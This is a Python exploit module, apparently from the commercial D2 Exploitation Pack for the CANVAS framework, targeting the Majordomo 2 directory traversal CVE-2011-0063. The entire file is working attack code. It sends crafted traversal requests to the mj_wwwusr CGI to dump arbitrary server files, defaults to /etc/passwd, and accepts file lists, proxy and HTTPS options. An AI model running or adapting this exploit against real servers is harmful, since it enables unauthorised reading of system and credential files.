#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#

import sys, time, os

sys.path.append(".")
sys.path.append("../../")

import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from httplib import HTTPConnection, HTTPSConnection

NAME = "d2sec_majordomo2"
VERSION = "0.1"
DESCRIPTION = "Majordomo Directory Traversal Vulnerability (Patch bypass)"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]

NOTES="""
Argument flist: specify a file containing a list of files to dump
"""

DOCUMENTATION = {}
DOCUMENTATION["Versions Affected"] = "Majordomo 2 before 20110203"
DOCUMENTATION["Date public"] = "2011/03/08"
DOCUMENTATION["References"] = "http://sotiriu.de/adv/NSOADV-2011-003.txt"
DOCUMENTATION["CVE Name"] = "CVE-2011-0063"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0063"
DOCUMENTATION["Notes"] = NOTES

class theexploit (tcpexploit):
    
	def __init__(self):
		tcpexploit.__init__(self)
		self.host = ""
		self.port = 80 
		self.fname = '/etc/passwd' 
		self.flist = ""
		self.https = 0
		self.website = self.host
		self.proxy_host = ""
		self.proxy_port = 0
		self.name = NAME
		return
	
	def display_file(self, fname):
		request = '/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=./..././..././..././..././..././..././..././.../%s' % fname
		try:
			if self.proxy_host and self.proxy_port > 0:
				cnx = HTTPConnection(self.proxy_host, self.proxy_port)
				if self.https == 0:
					cnx.request("GET","http://"+self.host+"/"+request,None,{"Host":self.website})
				else:
					cnx.request("GET","https://"+self.host+"/"+request,None,{"Host":self.website})
			else:
				if self.https == 0:
					cnx = HTTPConnection(self.host, self.port)
				else:
					cnx = HTTPSConnection(self.host, self.port)
				cnx.request("GET",request,None,{"Host":self.website})
			resp = cnx.getresponse()
			body = resp.read()
			try:
				cnx.close()
			except Exception:
				pass
		except Exception:
			try:
				cnx.close()
			except Exception:
				pass
			body = "HTTP(S) Transfer error"
		if body.find("Error report") >= 0:
			return ''
		else:
			return body

	def getargs(self):	
		self.host = self.target.interface
		self.port = int(self.argsDict.get("port",self.port))
		self.fname = self.argsDict.get("fname",self.fname)
		self.flist = self.argsDict.get("flist",self.flist)
		self.https = int(self.argsDict.get("https",self.https))
		self.website = self.argsDict.get("website",self.website)
		self.proxy_host = self.argsDict.get("hproxy",self.proxy_host)
		self.proxy_port = self.argsDict.get("pproxy",self.proxy_port)

	def run(self):
		self.getargs()
		self.setInfo('[D2] %s attacking %s:%d' % (NAME,self.host,self.port))
		if len(self.fname) > 0 and len(self.flist) > 0:
			self.log('[D2] You must only specify a file or a list of files')
			return 1
		flist = []
		if len(self.fname) > 0:
			flist.append(self.fname)
		elif len(self.flist) > 0:
			try:
				ftemp = open(self.flist, "r").readlines()
			except:
				self.log("[D2] Can't find %s" % self.flist)
				self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME,self.host,self.port))
				return 1
			for f in ftemp:
				f = f.strip()
				flist.append(f)
		else:
			self.log('[D2] No file or list of files specified')
			self.setInfo('%s attacking %s:%d - failed' % (NAME,self.host,self.port))
			return 1
		for f in flist:
			self.log('[#] %s' % f)
			self.log(self.display_file(f))
			self.log('\n')
		self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
		return 0

	def usage(self):
		print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O https:[0|1] -O hproxy:host -O pproxy:port -O website:<url> -O fname:<path> -O flist:<path>" 
		sys.exit(0)
    
if __name__ == '__main__':
	print "Running CANVAS %s v %s" % (NAME,VERSION)
	app = theexploit()
	ret = standard_callback_commandline(app)
